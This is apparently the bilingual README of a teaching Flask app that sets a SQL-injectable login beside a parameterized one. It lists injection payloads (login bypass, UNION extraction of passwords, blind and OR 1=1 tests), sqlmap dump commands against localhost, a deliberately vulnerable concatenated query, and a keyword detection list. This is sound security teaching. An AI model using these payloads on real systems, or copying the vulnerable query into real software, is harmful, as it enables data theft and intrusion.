# 🔐 SQL注入攻击与防御演示系统
## SQL Injection Attack & Defense Demo System

---

## 📋 项目简介 | Project Overview

这是一个专门用于**教学和研究目的**的SQL注入漏洞演示系统。通过对比"脆弱实现"与"安全实现"，帮助开发者和安全研究人员深入理解SQL注入攻击的原理、危害及防护措施。

This is a **educational and research-oriented** SQL injection vulnerability demonstration system. By comparing "vulnerable implementation" with "secure implementation", it helps developers and security researchers understand the principles, dangers, and protective measures of SQL injection attacks.

## 🎯 设计目标 | Design Goals

### 教学目标 | Educational Objectives
- ✅ 直观演示SQL注入漏洞的成因和利用过程
- ✅ 对比展示脆弱代码vs安全代码的实现差异  
- ✅ 提供真实可操作的攻击环境用于学习研究
- ✅ 验证各种防护机制的有效性

### 研究价值 | Research Value
- 🔬 支持安全研究和漏洞分析
- 🛡️ 测试防护工具和检测机制
- 📊 生成攻击流量用于分析
- 📝 提供详细的安全审计日志

## 🚀 快速开始 | Quick Start

### 环境要求 | Requirements
- Python 3.8+
- Flask框架
- SQLite数据库

### 安装步骤 | Installation

```bash
# 1. 克隆项目
git clone <repository-url>
cd sql_injection_demo

# 2. 安装依赖
pip install flask

# 3. 启动服务
python flask_sql_injection_demo.py

# 4. 访问系统
浏览器打开: http://127.0.0.1:5000
```

## 🧪 功能演示 | Feature Demo

### 核心端点 | Core Endpoints

| 端点 | 类型 | 说明 | URL |
|------|------|------|-----|
| **主页** | 安全 | 系统说明和导航 | `http://127.0.0.1:5000/` |
| **脆弱登录** | ⚠️ 危险 | 包含SQL注入漏洞 | `http://127.0.0.1:5000/login_vuln` |
| **安全登录** | ✅ 安全 | 使用参数化查询 | `http://127.0.0.1:5000/login_safe` |
| **用户列表** | 信息 | 显示数据库用户 | `http://127.0.0.1:5000/users` |
| **攻击统计** | 分析 | 显示攻击日志 | `http://127.0.0.1:5000/stats` |

### 测试账户 | Test Accounts

```
管理员账户: admin / admin123
普通用户: alice / alice_password  
普通用户: bob / bob123
测试账户: test_user / test123
```

## 🔍 SQL注入攻击演示 | SQL Injection Demonstration

### 手动测试 | Manual Testing

#### 基础注入测试
```bash
# 绕过登录验证
curl "http://127.0.0.1:5000/login_vuln?username=admin'--&password=any"

# 联合查询攻击
curl "http://127.0.0.1:5000/login_vuln?username=' UNION SELECT 1,username,password FROM users--&password=any"

# 布尔盲注测试  
curl "http://127.0.0.1:5000/login_vuln?username=admin' AND 1=1--&password=any"
```

#### 高级注入场景
```bash
# 复杂联合查询
curl "http://127.0.0.1:5000/advanced_vuln?search=' UNION SELECT username,password,'HACKED' FROM users--"

# 条件注入
curl "http://127.0.0.1:5000/advanced_vuln?search=' OR 1=1--"
```

### 自动化测试 | Automated Testing

#### 使用sqlmap进行渗透测试

```bash
# 基础扫描 - 检测注入点
sqlmap -u "http://127.0.0.1:5000/login_vuln?username=test&password=test" --batch

# 数据提取 - 获取数据库内容
sqlmap -u "http://127.0.0.1:5000/login_vuln?username=test&password=test" --batch --dump

# 深度扫描 - 高风险高等级测试
sqlmap -u "http://127.0.0.1:5000/login_vuln?username=test&password=test" --batch --level=3 --risk=3

# 测试安全端点（应该检测不到漏洞）
sqlmap -u "http://127.0.0.1:5000/login_safe?username=test&password=test" --batch
```

## 📊 安全对比分析 | Security Comparison

### 脆弱实现分析 | Vulnerable Implementation Analysis

```python
# ❌ 危险的字符串拼接
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# 问题分析:
# 1. 直接拼接用户输入到SQL语句
# 2. 未进行输入验证和过滤  
# 3. 容易受到各种SQL注入攻击
# 4. 可能导致数据泄露、权限提升
```

### 安全实现分析 | Secure Implementation Analysis

```python
# ✅ 安全的参数化查询
cur = get_db().execute(
    "SELECT id, username, role FROM users WHERE username=? AND password=?", 
    (username, password)
)

# 安全特性:
# 1. 使用参数化查询防止注入
# 2. 自动处理特殊字符转义
# 3. 输入长度限制
# 4. 敏感信息过滤
```

## 🛡️ 防护机制 | Defense Mechanisms

### 代码层面防护 | Code-Level Protection

1. **参数化查询 (Parameterized Queries)**
   - 使用占位符而非字符串拼接
   - 自动处理特殊字符转义

2. **输入验证 (Input Validation)**
   - 长度限制、格式检查
   - 白名单过滤

3. **最小权限原则 (Least Privilege)**
   - 数据库账户权限限制
   - 敏感信息访问控制

### 系统层面防护 | System-Level Protection

1. **Web应用防火墙 (WAF)**
2. **数据库审计和监控**
3. **定期安全代码审查**
4. **错误信息控制**

## 📈 日志和监控 | Logging & Monitoring

### 攻击检测 | Attack Detection

系统内置基础的SQL注入检测机制：

```python
suspicious_patterns = [
    "'", '"', '--', '/*', '*/', 'union', 'select', 
    'drop', 'delete', 'insert', 'update', 'or 1=1'
]
```

### 日志文件 | Log Files

- `app.log` - 应用程序运行日志
- `attack_log.txt` - 攻击尝试记录
- `demo.db` - SQLite数据库文件

### 统计分析 | Statistics

访问 `/stats` 端点查看：
- 攻击尝试总数
- 最近攻击记录
- 系统运行状态

## 🔬 研究扩展 | Research Extensions

### 机器学习检测 | ML-based Detection

可以基于此系统开发：
- SQL注入模式识别
- 异常流量检测
- 攻击行为分析

### 防御技术测试 | Defense Technology Testing

- WAF规则验证
- IDS/IPS效果评估
- 代码扫描工具测试

## ⚠️ 重要声明 | Important Notice

### 使用限制 | Usage Restrictions

**🚨 本系统仅用于教育和研究目的！**

- ✅ 允许：安全教学、学术研究、防护测试
- ❌ 禁止：恶意攻击、非法入侵、商业滥用

**🚨 This system is for educational and research purposes only!**

- ✅ Allowed: Security education, academic research, defense testing
- ❌ Prohibited: Malicious attacks, illegal intrusion, commercial abuse

### 法律责任 | Legal Responsibility

使用者应当：
- 遵守当地法律法规
- 遵循道德准则
- 承担使用责任

Users should:
- Comply with local laws and regulations  
- Follow ethical guidelines
- Take responsibility for usage

## 📚 学习资源 | Learning Resources

### 推荐阅读 | Recommended Reading

1. **OWASP SQL Injection Prevention Cheat Sheet**
2. **SQLite Documentation**
3. **Flask Security Best Practices**
4. **Web Application Security Testing**

### 相关工具 | Related Tools

- **sqlmap** - 自动化SQL注入检测工具
- **Burp Suite** - Web应用安全测试
- **OWASP ZAP** - 安全扫描工具

## 🤝 贡献指南 | Contributing

欢迎提交问题和改进建议：
- 报告Bug和安全问题
- 提出功能增强建议  
- 完善文档和示例
- 添加新的攻击场景

## 📞 联系方式 | Contact

如有问题或建议，请通过以下方式联系：
- 提交Issue到项目仓库
- 发送邮件到维护者

---

**记住：网络安全从了解漏洞开始，防护从正确编程开始！**

**Remember: Cybersecurity starts with understanding vulnerabilities, and protection starts with proper programming!** 